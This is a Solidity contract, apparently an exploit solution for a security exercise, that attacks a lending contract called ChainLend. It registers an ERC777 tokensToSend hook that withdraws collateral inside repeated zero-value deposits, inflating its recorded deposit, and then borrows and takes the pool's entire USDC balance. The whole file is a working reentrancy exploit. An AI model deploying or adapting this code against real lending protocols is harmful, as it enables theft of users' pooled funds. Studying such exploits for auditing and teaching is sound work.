// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./ChainLend.sol";
import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";

contract ChainLendAttacker {
    ChainLend chainlend;
    IERC20 imBTC;
    IERC20 usdc;

    address private owner;

    // registry address
    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    uint256 private constant ONE_IMBTC = 1e8;

    constructor(address _chainLend, address _imBTC, address _usdc) {
        chainlend = ChainLend(_chainLend);
        imBTC = IERC20(_imBTC);
        usdc = IERC20(_usdc);

        owner = msg.sender;
        // only approve 64 imBTC tranfer for the looping
        imBTC.approve(address(chainlend), 64 * ONE_IMBTC);
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC777TokensSender"), address(this));
    }

    function attack() external {
        require(msg.sender == owner, "only owner");
        // protocol should think we have deposited 63 imBTC in order to allow us to borrow 1 mil usdc
        for (uint8 i = 0; i <= 63; i++) {
            // First deposit 1 imBTC
            chainlend.deposit(ONE_IMBTC);
            //Second deposit
            chainlend.deposit(0);
        }

        // borrow 1_000_000 USDC
        uint256 usdcBalance = usdc.balanceOf(address(chainlend));
        chainlend.borrow(usdcBalance);

        // send all usdc and imBTC back
        usdc.transfer(owner, usdcBalance);

        imBTC.transfer(owner, ONE_IMBTC);
    }

    function tokensToSend(address, address, address, uint256 _amount, bytes calldata, bytes calldata) external {
        require(msg.sender == address(imBTC), "not imBTC");

        // only in the second deposit
        if (_amount == 0) {
            chainlend.withdraw(ONE_IMBTC);
        }
    }
}
